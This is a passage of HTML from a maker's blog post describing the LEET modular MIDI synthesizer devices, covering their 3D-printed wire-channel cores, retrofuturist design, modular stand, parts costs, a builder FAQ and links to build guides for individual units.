https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/3dpcb-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>The backside of a keyboard, showing the wire channels and solder joints.  No need for a PCB!</figcaption></figure>



<p>All devices are built around a 3D printed core (3DPCB) that creates the exterior of the product, holds all components in place and has integrated wire channels that connects the components in a fool proof way. 3DPCB makes the devices easier to replicate, less expensive and you don‚Äôt need to wait for PCB delivery.</p>



<h2>Techy retrofuturism</h2>



<figure><amp-img width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/green-pad-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></figure>



<p>I designed the devices to be simplistic, solid and playful. The design might be called retrofuturism since they are inspired by old-school mainframe computers from the 70s with lots of blinkenlights like PDP-10, but the addition of full color LEDs and 3DPCBs makes them futuristic at the same time (maybe they are from a past that never happened ;)</p>



<h2>Modularity</h2>



<p>I kept the form factor for each unit similar and designed a simple snap on stand where two or three units can be stacked and tilted for easy access. The units can also be equipped with magnets, allowing them to be snapped together side by side. With this approach, a two or three octave keyboard can be constructed by joining modules next to each other. </p>



<figure><amp-img width="740" height="360" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="360" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/2octave-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></figure>



<p>There is also a snap on accessory that just contains a sticker in order to identify the units. Like ‚ÄúLead, ch2‚Äù or ‚ÄúDrums, ch7‚Äù.</p>



<figure><amp-img width="740" height="451" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=740%2C451&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=1024%2C624&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=768%2C468&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=1536%2C936&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=2048%2C1248&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="451" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=740%2C451&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=1024%2C624&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=768%2C468&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=1536%2C936&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?resize=2048%2C1248&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/synth2.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzQ1MScgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>3Dprinted stand holds two or three models in place</figcaption></figure>



<h2>Development</h2>



<p>This project started as an idea to develop a synth using the 3DPCB idea. I initially planned to design a self-contained synth with batteries, sound generation and built-in speaker, but quickly realized that it would be more useful to build a modular system instead. By using MIDI, the project becomes flexible and enable high quality sound generation. I considered using MIDI over Bluetooth, but the increased complexity with batteries, charging circuits, size, cost and reliability, made me stick with traditional USB connections.</p>



<p>Before I started, I defined some goals for the project ‚Äì this is what I aimed for:</p>



<div><div>
<ul><li>Playful</li><li>Modular</li><li>MIDI</li><li>Portable</li><li>Affordable</li><li>Easy to replicate</li><li>Lots of blinkenlights</li></ul>
</div></div>



<p>To demonstrate the abilities, I decided to develop different parts that are needed for a system that can record and playback a song with a keyboard, arpeggiator and a basic sequencer.</p>



<figure><amp-img width="740" height="304" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white.jpg?resize=740%2C304&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=1024%2C420&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=300%2C123&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=768%2C315&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=1536%2C630&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=2048%2C840&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="304" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white.jpg?resize=740%2C304&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=1024%2C420&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=300%2C123&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=768%2C315&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=1536%2C630&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?resize=2048%2C840&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/allviews_white-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzMwNCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></figure>



<p>To me this is a proof of concept ‚Äì see it as a base for inspiration. The input units/ keyboards are working great, but the more complicated sequencer has room for improvements. I hope that others will assist on development and that future firmware releases will improve the functionality.</p>



<p>What I really like with the project is how easy it is to build something unique. Combining the components (microprocessor, LEDs and switches) is like building with LEGO. It would take me less than a day to build a working keyboard that starts with the note ‚ÄúA‚Äù instead of ‚ÄúC‚Äù (if I for some reason would want one). Adding a gamepad joystick, or even a light sensor to control pitch bend, is just as easy. Sure, you need to have basic understanding of electronics, 3D modelling and Arduino programming, but it‚Äôs not that complicated, and a project like this is a great learning experience.</p>



<figure><amp-img width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="360" src="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix.jpg?resize=740%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=1024%2C498&amp;ssl=1 1024w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=300%2C146&amp;ssl=1 300w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=768%2C373&amp;ssl=1 768w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=1536%2C747&amp;ssl=1 1536w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?resize=2048%2C996&amp;ssl=1 2048w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?w=1480&amp;ssl=1 1480w, https://i1.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/matrix-scaled.jpg?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></figure>



<h2>FAQ</h2>



<div><div>
<blockquote><p><strong>Can anyone build one?&nbsp;</strong><br>If you can hold a soldering iron in the right end you should be fine. My 12-year-old have built a keyboard that works great.<br></p><p><strong>What equipment is needed?</strong><br>You need a 3D printer (fff/ fdm) with a spool of PLA plastic, a soldering station with a narrow tip (and preferably a smoke extractor) and basic tools like pliers. If you don‚Äôt have this at home visit your local hackerspace!<br></p><p><strong>What does it cost?</strong><br>The components for keyboard costs around <strong>$6</strong> (depending on shipping and supplier). Prices from eBay: <br>* Arduino pro micro ($4), <br>* 13 LEDs from a ws2812 led strip (60led/m) ($1.1), <br>* 15 6√ó6 tact switches ($0.2), <br>* 34g PLA filament ($0.7).<br>The more expensive sequencer also needs <br>* 2pcs of 8√ó8 ws2812 LED matrixes (2*$8) and <br>* a micro SD card reader ($3)<br></p><p><strong>How long does it take to build one?</strong><br>Printing time for a keyboard is 3.5h on a Prusa i3 and soldering takes 1-2 hours, depending on your experience.</p><p><br><strong>What is generating the sound?</strong><br>A computer or mobile phone generates the sounds mapped to different channels. Sunvox is a great free option, but DAWs like Ableton Live, Logic Pro, Pro Tools, FL Studio, Cubase, Studio one, Reason, Garageband can be used.<br>The keyboards and sequencers are only sending MIDI commands (like note C3 on channel 4 at full velocity). This gives you full freedom to choose from east coast (subtractive), west coast (additive), FM, samples, wavetable, vector, granular or any other synthesis of choice. With a MIDI to CV interface they can control analog modular systems. Maybe I should design a eurorack version one day?..</p><p><br><strong>Is the keyboard velocity sensitive?</strong><br>No, the standard tact switches used does not provide any velocity or after-touch data. Using two switches per key and measure time difference can be done, but not something I have investigated.<br></p><p><strong>How big is it?</strong><br>The dimensions of a keyboard unit are 154x45x8mm (6√ó1.8√ó0.3 inches) (without cables and knobs)</p><p><br><strong>This is a great project ‚Äì how can I help?</strong><br>I appreciate all feedback and ideas for future devices and improvements.<br>It would be super cool to develop a simple Android or PC application that maps soundfonts/ samples to different MIDI channels and automatically echo MIDI commands to enable LED feedback. If you are good at embedded development, the sequencer has room for improvements.</p><p><span>I created a forum where people who want to contribute can share ideas and assist with development: <a rel="noreferrer noopener" href="https://vonkonow.com/wordpress/forums/forum/leet-synthesizer-development/" target="_blank">https://vonkonow.com/wordpress/forums/forum/leet-synthesizer-development/</a></span></p><p><br><strong>What does it take to modify or hack one?</strong><br>Most important is a ‚Äúhow hard can it be?‚Äú mentality. Modifying it is a great way to understand how it works and learn new things. When you are done you will know more about electronics, 3D CAD and embedded programming. Don‚Äôt forget to post your hacks!</p><p><br><strong>Do you have any ideas for future improvements?</strong><br>Yes, lots of them, here are some:<br>* A playback device (Raspberry Pi zero?) that generates sound without the need  for mouse, keyboard or monitor. (MIDI in -&gt; audio out). Maybe something like <a href="https://vonkonow.com/wordpress/forums/topic/ideas-for-a-raspberry-pi-based-synth-engine/">this</a>: <br>* A keyboard with mechanical linear switches (Gateron/ Kailh/ Cherry MX)<br>* A keyboard covering two octaves<br>* A keyboard with a small MIDI sampler and transposable playback.<br>* A tiny sequencer with 0.96‚Äù OLED display(s) instead of LED matrix.<br>* A full color MIDI visualizer using the sequencer display.<br>* An AI based deep learning synth using google magenta and ESP32‚Ä¶</p></blockquote>
</div></div>



<h2>Build your own</h2>



<p>Below are links to posts for each of the different LEET Devices. All of them with BOM, building instructions and code + 3D models needed to replicate them. </p>



<p>Don‚Äôt forget to&nbsp;<a href="https://vonkonow.com/wordpress/forums/topic/user-gallery-share-your-builds/">share your build in the forum</a>. The forum is also the best place to<a href="https://vonkonow.com/wordpress/forums/forum/leet-synthesizer-development/"> share ideas, assist with development</a> and &nbsp;<a href="https://vonkonow.com/wordpress/forums/forum/leet-synthesizer-support/">get support and help other LEET builders</a></p>



<figure><a href="https://vonkonow.com/wordpress/forums/"><amp-img src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=230%2C256&amp;ssl=1" alt="" width="230" height="256" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=918%2C1024&amp;ssl=1 918w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=269%2C300&amp;ssl=1 269w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=768%2C856&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?w=1140&amp;ssl=1 1140w" sizes="(max-width: 230px) 100vw, 230px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=230%2C256&amp;ssl=1" alt="" width="230" height="256" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=918%2C1024&amp;ssl=1 918w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=269%2C300&amp;ssl=1 269w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?resize=768%2C856&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/forum-Converted.png?w=1140&amp;ssl=1 1140w" sizes="(max-width: 230px) 100vw, 230px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1Nicgd2lkdGg9JzIzMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a></figure>



<figure><amp-img width="740" height="217" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=740%2C217&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=1024%2C300&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=300%2C88&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=768%2C225&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=1536%2C450&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=2048%2C600&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="217" src="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=740%2C217&amp;ssl=1" alt="" srcset="https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=1024%2C300&amp;ssl=1 1024w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=300%2C88&amp;ssl=1 300w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=768%2C225&amp;ssl=1 768w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=1536%2C450&amp;ssl=1 1536w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?resize=2048%2C600&amp;ssl=1 2048w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?w=1480&amp;ssl=1 1480w, https://i0.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/344Resurs-3.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzIxNycgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Example of step by step illustration, complementing video and building instructions.</figcaption></figure>



<h2>LEET Keyboard </h2>



<figure><a href="https://vonkonow.com/wordpress/leet-keyboard/"><amp-img width="740" height="217" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=740%2C217&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=1024%2C300&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=300%2C88&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=768%2C225&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=1536%2C450&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=2048%2C600&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="217" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=740%2C217&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=1024%2C300&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=300%2C88&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=768%2C225&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=1536%2C450&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?resize=2048%2C600&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/10/keyboard_front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzIxNycgd2lkdGg9Jzc0MCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption><a rel="noreferrer noopener" href="https://vonkonow.com/wordpress/leet-keyboard/" target="_blank">https://vonkonow.com/wordpress/leet-keyboard/</a></figcaption></figure>



<h2>LEET Chord</h2>



<figure><a href="https://vonkonow.com/wordpress/leet-chord/"><amp-img width="740" height="217" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=740%2C217&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=1024%2C300&amp;ssl=1 1024w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=300%2C88&amp;ssl=1 300w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=768%2C225&amp;ssl=1 768w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=1536%2C450&amp;ssl=1 1536w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=2048%2C600&amp;ssl=1 2048w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?w=1480&amp;ssl=1 1480w, https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?w=2220&amp;ssl=1 2220w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="740" height="217" src="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=740%2C217&amp;ssl=1" alt="" srcset="https://i2.wp.com/vonkonow.com/wordpress/wp-content/uploads/2020/11/chord-front.png?resize=1024%2C300&amp;ssl=1 1024w, 